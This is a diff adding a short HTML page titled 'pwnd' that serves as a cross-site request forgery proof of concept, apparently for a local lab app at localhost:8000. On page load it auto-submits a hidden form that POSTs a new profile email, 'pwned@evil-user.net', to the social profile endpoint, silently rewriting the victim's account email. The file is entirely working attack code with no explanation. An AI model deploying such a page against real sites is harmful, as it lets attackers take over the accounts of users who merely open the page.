@@ -1,0 +1,10 @@
+<!doctype html>
+<html lang="en">
+<title>pwnd</title>
+You have been pwned
+<body onload="document.frm1.submit()" >
+    <form action="localhost:8000/social/profile" method="POST" name="frm1" >
+      <input type="hidden" name="Email" value="pwned@evil-user.net" />
+    </form>
+  </body>
+</html>
